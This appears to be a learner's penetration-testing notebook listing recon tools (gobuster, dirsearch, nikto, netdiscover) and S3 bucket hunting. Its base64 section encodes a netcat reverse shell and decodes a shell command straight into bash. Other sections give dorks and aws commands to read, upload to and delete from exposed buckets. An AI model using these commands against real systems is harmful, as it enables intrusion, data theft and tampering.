# John the ripper   #

sudo #john -h

# Hash identifier # 

#hash-indentifier

# enum4linux # 
 #enum4linux 
 
 
# PYTHON TERMINAL #
```
python -c 'import pty;pty.spawn("/bin/bash")'
````
#pythonterminal 

# FPING # 
Detects active host on the net, but its better use arp-scan because it shows mac and other info
```
sudo fping -a -g 192.168.100.0/24
```
![[fping.png]]

# DIRBUSTER # 
We search sub domains on the a DNS/
#dirbuster 
```
gobuster vhost--append-domain -u cybox.company -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt | tee subdomines.txt
```
**that of vhost i dont know if it's ony in virtual box or other platforms I will try if I have some error**
**I was crying because I discovered that if I put append domain I can discover the subdomains**
--append domain (if i dont put this the sub domain doesnt appear)
-u specify the url
-w we use the wordlist 
Where i puted the pipe and tee subdomines.txt is that I will put this research in a file caled subdomines.txt


# Dirsearch #
#dirsearch 
Searchs for hidden directorys on a DNS  ( or hidden urls)
![[Cibersecurity/IMAGES/a.png]]

***python3 dirsearch.py*** -u http://192.168.0.33 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 150 -e php,txt,html -f
**LOOK THAT IS DIFFERENT , IT IS NOT ONLY DIRSEARCH LIKE THE PICTURE**

**WHEN I DOWNLOADED IT FROM KALI LINUX WAS DEPRECATED , SO YOU MUST USE PTHTON 3 BEFORE ALL THE COMAND !!!**
dirsearch
-u Specify url
-w Select the word list that you are going to use
-t the quantity  of "threads" (wtf is thread in IT ?)
-e extensions it can be php,txt,html,js,etc 
-f "force"   forzar el uso de extensiones
 
# Net discover

#netdiscover

It is a tool used for discover wlan o lan you must use with the next comand
```
sudo netdiscover -i eth0 (or wlan0 or your lan) -r (specify a range 192.168.100.0/24 for example)
```
its useful put sudo netdiscover -h and look more options

# cyberchef
#cyberchef 

https://gchq.github.io/CyberChef/ (we dont need to dowload nothing)

https://www.youtube.com/watch?v=TMt7BlgpL3A


# base64 #
#base64 

cds@cds:~$ echo nc -e /bin/bash 192.168.100.4 4444 | base64
bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTAwLjQgNDQ0NAo=

WE CAN ENCODE THINGS WITH BASE64 or decimal hexadecimal etc with this command

this is when you need decode something .. 

echo 'bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTAwLjM3IDQ0NDQK' | base64 -d | bash


# Nikto

#nikto

nikto -h (DNS or IP) and it returns something like this

```+ Multiple index files found: /index.php, /index.html.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /admin/: This might be interesting.
+ /secret/: This might be interesting.
+ /store/: This might be interesting.
+ /admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ 8103 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2023-07-26 20:41:04 (GMT2) (30 seconds)
---------------------------------------------------------------------------
```

# whatweb#

#whatweb

whatweb http://192.168.0.38
Aplicates a search about the technologies that are behind of the website

```
http://192.168.0.38 [200 OK] Apache[2.4.48], Bootstrap, Cookies[qdPM8], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[192.168.0.38], JQuery[1.10.2], PasswordField[login[password]], Script[text/javascript], Title[qdPM | Login], X-UA-Compatible[IE=edge]
```

# COMMONSPEAK 2  

Generates wordlists

(https://github.com/
assetnote/commonspeak2/)


Good idea, combine different wordlists , deleting the repeated words
```
sort -u list1.txt list2.txt
```

# Find probable valid sub domains
A good tool for automating this process is
Altdns (https://github.com/infosec-au/altdns/), which discovers subdomains with
names that are permutations of other subdomain names.


# Screenshot of subdomains 

Manually visiting all the pages you’ve found through brute-forcing can be
time-consuming. Instead, use a screenshot tool like EyeWitness (https://github
.com/FortyNorthSecurity/EyeWitness/) or Snapper (https://github.com/dxa4481/
Snapper/)

# s3 amazon buckets #

Exposed ones :
(https://buckets.grayhatwarfare.com/)

google dorks

```
site:s3.amazonaws.com COMPANY_NAME
site:amazonaws.com COMPANY_NAME


amazonaws s3 COMPANY_NAME
amazonaws bucket COMPANY_NAME
amazonaws COMPANY_NAME
s3 COMPANY_NAME
```

Brute-force buckets by using keywords. Lazys3
(https://github.com/nahamsec/lazys3/)

Another good tool is Bucket Stream (https://github.com/eth0izzle/
bucket-stream/), which parses certificates belonging to an organization and
finds S3 buckets based on permutations of the domain names found on the
certificates.


pip install awscli

Configure it:
```
https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html.
```
read the content
```
aws s3 ls s3://BUCKET_NAME/
```

copy to the local machine
```
aws s3 cp s3://BUCKET_NAME/FILE_NAME/path/to/local/directory
```

Coping files to the bucket
```
aws s3 cp TEST_FILE s3://BUCKET_NAME/
```
Removing files from the bucket
```
aws s3 rm s3://BUCKET_NAME/TEST_FILE
```

# Key hacks #

KeyHacks (https://github.com/streaak/keyhacks/) to check if the credentials are
valid and learn how to use them to access the target’s services.

# Github automated scan tools #
Tools like Gitrob and TruffleHog can automate the GitHub recon pro-
cess. Gitrob (https://github.com/michenriksen/gitrob/) locates potentially sensitive

files pushed to public repositories on GitHub. TruffleHog (https://github.com/

trufflesecurity/truffleHog/) specializes in finding secrets in repositories by con-
ducting regex searches and scanning for high-entropy strings.



# Paste hunter#

PasteHunter (https://github.com/kevthehermit/PasteHunter/) to scan for publicly pasted data.


# Tomnomnom’s tool Waybackurls#

(https://github.com/tomnomnom/waybackurls/) can automatically extract end-
points and URLs from the Wayback Machine.

